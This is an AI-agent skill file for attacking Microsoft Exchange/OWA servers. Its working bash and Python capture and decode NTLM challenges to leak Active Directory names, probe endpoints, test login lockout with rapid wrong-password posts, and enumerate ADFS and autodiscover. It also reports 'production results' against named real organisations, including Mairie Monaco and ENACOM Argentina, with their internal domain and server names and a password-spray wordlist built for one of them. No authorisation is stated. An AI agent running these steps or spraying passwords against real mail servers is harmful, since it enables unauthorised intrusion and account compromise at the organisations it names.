---
name: exchange-owa-attack
description: Exchange/OWA NTLM AD leak, spray attack when mail subdomain.
version: 1.0.0
author: agentiko
license: MIT
platforms: [linux]
compatibility: Requires agentiko worker (curl, nmap, python3, masscan, subfinder, httpx, nuclei)
metadata:
  hermes:
    tags: [recon, exchange, OWA, NTLM, ActiveDirectory, password-spray]
    category: recon
    related_skills:
      - port-service-discovery
      - zimbra-attack
      - subdomain-enumeration
---

# Exchange/OWA Attack Skill

Exchange Outlook Web Access (OWA) reconnaissance — NTLM Type-2 challenge decoding for AD domain/computer name extraction, OWA endpoint mapping, password spray surface assessment, and version fingerprinting for known CVEs. Confirmed on Mairie Monaco (Exchange 2019 CU15, AD domain MAIRIE.local), ENACOM Argentina (Exchange 2016, domain CNC.INTER), realpro.com (OWA + Exchange servers), and Panco (ADFS + Office 365).

## When to Use

- Target has `owa.`, `mail.`, `webmail.`, `exchange.`, or `autodiscover.` subdomains.
- crt.sh reveals Exchange-related SAN names (`mail.domain.com`, `autodiscover.domain.com`).
- Port 443 returns NTLM `WWW-Authenticate: Negotiate` or `WWW-Authenticate: NTLM`.
- After `subdomain-enumeration` discovers mail-related hosts.
- After `port-service-discovery` finds HTTPS on port 443 with Exchange fingerprints.

## Prerequisites

- `terminal` tool with curl, python3.
- Target Exchange/OWA URL.
- For password spray: list of usernames (from recon) and password candidates.

## How to Run

```bash
# Quick Exchange detection
curl -skI "https://TARGET/owa/" | grep -iE "x-owa-version|x-feserver|exchange|microsoft"

# NTLM challenge capture (AD domain leak)
curl -skI "https://TARGET/owa/" -H "Authorization: Negotiate TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==" | grep -i "www-authenticate"
```

## Quick Reference

| Technique | What It Reveals | Severity |
|-----------|---------------|---------|
| NTLM Type-2 decode | AD domain, NetBIOS name, computer name, AD timestamp | High |
| OWA version header | Exchange version, CU level, patch status | Medium |
| `/owa/auth/logon.aspx` | Login page, brute force surface | Medium |
| `/ecp/` | Exchange Control Panel (admin) | High |
| `/ews/` | Exchange Web Services (SOAP API) | Medium |
| `/autodiscover/` | Autodiscover configuration | Medium |
| `/mapi/` | MAPI over HTTP | Low |
| `/Microsoft-Server-ActiveSync` | Mobile device sync | Medium |
| `/rpc/` | Outlook Anywhere (RPC over HTTP) | Low |

## Procedure

### Phase 1 — Exchange Detection & Fingerprinting

```bash
TARGET="$1"
OUTDIR="/root/output/exchange"
mkdir -p "$OUTDIR"

echo "[*] Exchange detection on $TARGET"

# OWA probe
OWA_RESP=$(curl -skI --max-time 10 "https://$TARGET/owa/" 2>/dev/null)
echo "$OWA_RESP" > "$OUTDIR/owa_headers.txt"

# Version extraction
X_OWA=$(echo "$OWA_RESP" | grep -i "x-owa-version" | sed 's/.*: //')
X_FE=$(echo "$OWA_RESP" | grep -i "x-feserver" | sed 's/.*: //')

if [[ -n "$X_OWA" ]]; then
  echo "[+] Exchange confirmed — OWA Version: $X_OWA"
  echo "  Frontend server: ${X_FE:-unknown}"

  # Map version to CU
  # 15.1.x = Exchange 2016, 15.2.x = Exchange 2019
  MAJOR=$(echo "$X_OWA" | cut -d. -f1-2)
  if [[ "$MAJOR" == "15.1" ]]; then
    echo "  Product: Exchange 2016"
  elif [[ "$MAJOR" == "15.2" ]]; then
    echo "  Product: Exchange 2019"
  fi
else
  echo "[-] No OWA version header — may not be Exchange"
fi

# Key endpoints probe
declare -A EX_ENDPOINTS
EX_ENDPOINTS["/owa/auth/logon.aspx"]="Login page"
EX_ENDPOINTS["/ecp/"]="Exchange Control Panel (admin)"
EX_ENDPOINTS["/ews/exchange.asmx"]="Exchange Web Services (SOAP)"
EX_ENDPOINTS["/autodiscover/autodiscover.xml"]="Autodiscover"
EX_ENDPOINTS["/mapi/emsmdb/"]="MAPI over HTTP"
EX_ENDPOINTS["/Microsoft-Server-ActiveSync/"]="ActiveSync"
EX_ENDPOINTS["/rpc/rpcproxy.dll"]="Outlook Anywhere"
EX_ENDPOINTS["/owa/healthcheck.htm"]="Health check"

echo ""
echo "[*] Endpoint probe:"
for ep in "${!EX_ENDPOINTS[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "https://$TARGET$ep")
  [[ "$code" == "200" ]] && echo "  [OPEN] $ep — ${EX_ENDPOINTS[$ep]}"
  [[ "$code" == "302" ]] && echo "  [REDIR] $ep — ${EX_ENDPOINTS[$ep]}"
  [[ "$code" == "401" ]] && echo "  [AUTH] $ep — ${EX_ENDPOINTS[$ep]}"
done
```

### Phase 2 — NTLM Type-2 Challenge Capture & Decode

```bash
TARGET="$1"

echo "[*] NTLM challenge capture from $TARGET"

# Send NTLM Type-1 (Negotiate) message via Authorization header
NTLM_RESP=$(curl -skI --max-time 10 "https://$TARGET/owa/" \
  -H "Authorization: Negotiate TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==" 2>/dev/null)

WWW_AUTH=$(echo "$NTLM_RESP" | grep -i "www-authenticate: negotiate" | sed 's/.*negotiate //i' | tr -d '\r\n ')

if [[ -n "$WWW_AUTH" ]]; then
  echo "[+] NTLM Type-2 challenge received!"
  echo "  Raw: ${WWW_AUTH:0:80}..."

  # Decode with Python (extract AV_PAIRS structure)
  echo "$WWW_AUTH" | python3 -c "
import base64, struct, sys

data = base64.b64decode(sys.stdin.read().strip())

# NTLM Type-2 message structure:
# Offset 12: Target Name
# Offset 16: Negotiate Flags
# Offset 20: Server Challenge
# Offset 28: Reserved
# Offset 32: Target Info (AV_PAIRS)

# Parse Target Info
if len(data) > 40:
    target_info_offset = struct.unpack_from('<I', data, 40)[0]
    target_info_len = struct.unpack_from('<I', data, 44)[0]
    av_pairs = data[target_info_offset:target_info_offset + target_info_len]

    print()
    print('=== NTLM Type-2 Decoded ===')
    pos = 0
    while pos < len(av_pairs) - 4:
        av_type = struct.unpack_from('<H', av_pairs, pos)[0]
        av_len = struct.unpack_from('<H', av_pairs, pos + 2)[0]
        av_value = av_pairs[pos + 4:pos + 4 + av_len]

        # AV_PAIR types
        types = {
            1: 'NetBIOS Computer Name',
            2: 'NetBIOS Domain Name',
            3: 'DNS Computer Name',
            4: 'DNS Domain Name',
            5: 'DNS Tree Name',
            6: 'Product Version',
            7: 'Timestamp',
        }
        label = types.get(av_type, f'Unknown({av_type})')
        if av_type in (1, 2, 3, 4, 5):
            value = av_value.decode('utf-16-le', errors='replace')
            print(f'  {label}: {value}')
        elif av_type == 7:
            ts = struct.unpack_from('<Q', av_value)[0]
            from datetime import datetime, timezone
            dt = datetime.fromtimestamp(ts / 10000000 - 11644473600, tz=timezone.utc)
            print(f'  Timestamp: {dt}')
        else:
            print(f'  {label}: {av_value.hex()}')

        pos += 4 + av_len
else:
    print('  No AV_PAIRS in response')
"
fi
```

### Phase 3 — Password Spray Surface Assessment

```bash
TARGET="$1"

echo "[*] Password spray surface assessment"

# Check for account lockout by testing rapid logins with invalid password
echo "[*] Rate limiting test (5 rapid attempts with wrong password)..."
for i in $(seq 1 5); do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 \
    -X POST "https://$TARGET/owa/auth.owa" \
    -d "destination=https://$TARGET/owa/&username=testuser$i@domain.com&password=WrongPass123!" 2>/dev/null)
  echo "  Attempt $i: HTTP $code"
done

# Check if Basic Auth is enabled (rare post-2022, but exists)
BASIC_AUTH=$(curl -skI --max-time 5 "https://$TARGET/owa/" \
  -H "Authorization: Basic dGVzdDp0ZXN0" 2>/dev/null | grep -i "www-authenticate.*basic")
if [[ -n "$BASIC_AUTH" ]]; then
  echo "  [!] Basic Auth ENABLED — easier brute force vector"
fi

# Check healthcheck endpoint (sometimes exposes version/config)
HEALTH=$(curl -sk --max-time 5 "https://$TARGET/owa/healthcheck.htm" 2>/dev/null)
if [[ -n "$HEALTH" ]] && echo "$HEALTH" | grep -qi "200 ok"; then
  echo "  [+] Healthcheck accessible — server status exposed"
fi
```

### Phase 4 — ADFS/Office 365 Recon (hybrid environments)

```bash
TARGET_DOMAIN="$1"  # e.g., company.com

echo "[*] ADFS/Office 365 recon on $TARGET_DOMAIN"

# Check for ADFS
ADFS_URL="https://sts.$TARGET_DOMAIN/adfs/ls/IdpInitiatedSignOn.aspx"
ADFS_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$ADFS_URL")
[[ "$ADFS_CODE" == "200" || "$ADFS_CODE" == "302" ]] && echo "  [+] ADFS: $ADFS_URL (HTTP $ADFS_CODE)"

# Check Office 365 tenant
O365_XML=$(curl -sk --max-time 5 "https://login.microsoftonline.com/getuserrealm.srf?login=user@$TARGET_DOMAIN&xml=1" 2>/dev/null)
if echo "$O365_XML" | grep -qi "Federated\|Managed"; then
  echo "  [+] Office 365 tenant: $(echo "$O365_XML" | grep -oP '<NameSpaceType>\K[^<]+')"
  echo "  $(echo "$O365_XML" | grep -oP '<DomainName>\K[^<]+')"
fi

# Autodiscover (leaks internal server names)
AUTODISCOVER=$(curl -sk --max-time 10 "https://autodiscover.$TARGET_DOMAIN/autodiscover/autodiscover.xml" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>user@'$TARGET_DOMAIN'</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>' 2>/dev/null)
if echo "$AUTODISCOVER" | grep -qi "server\|internal"; then
  echo "  [+] Autodiscover response — internal server names leaked"
  echo "$AUTODISCOVER" | grep -oP '(?:<Server>|<InternalRpcClientServer>|<ASUrl>)[^<]+' | head -5
fi
```

## Real Production Results

### Mairie Monaco — Exchange 2019 CU15
- AD Domain: `MAIRIE.local`, NetBIOS: `MAIRIE`
- Servers: SRV-EXCH1, SRV-EXCH2 (extracted from NTLM challenge)
- Zero rate limiting on OWA
- No account lockout — password spray viable
- DMARC p=none on mairie.mc (email spoofing vector)

### ENACOM Argentina — Exchange 2016 15.1.2507.61
- AD Domain: `CNC.INTER`
- Basic Auth enabled
- Healthcheck exposed
- Azure AD Tenant ID: `2f362945-6c2f-4b46-8262-13a53b733e6e` leaked in subdomain JS

### Mairie Exchange Password Spray Pattern (French government naming)
```python
names = ["monaco", "mairie", "prince", "palais", "admin"]
suffixes = ["2026", "2025", "2024", "123", "!"]
passwords = [f"{n.capitalize()}{s}!" for n in names for s in suffixes]
```

## Pitfalls

- **NTLM relay requires specific network position.** Unless you control a machine the Exchange server can reach, NTLM relay is not exploitable remotely.
- **Modern Exchange (Exchange Online, 2019+) blocks Basic Auth by default.** Test with Modern Auth (OAuth2) if Basic is blocked.
- **Account lockout policies vary.** Test with a single known-bad password before spraying.
- **ADFS is NOT Exchange.** ADFS is a separate service with its own attack surface (SAML, WS-Trust).

## Verification

- NTLM Type-2 MUST decode to reveal at minimum DNS Domain Name and NetBIOS Domain Name.
- OWA version MUST be extracted from `X-OWA-Version` header.
- Password spray surface: confirm NO rate limiting (5 rapid attempts all return the same HTTP code).
- Autodiscover MUST return internal server names (not just external URLs).
- Document: Exchange version, AD domain, NetBIOS name, computer names, rate limiting status.
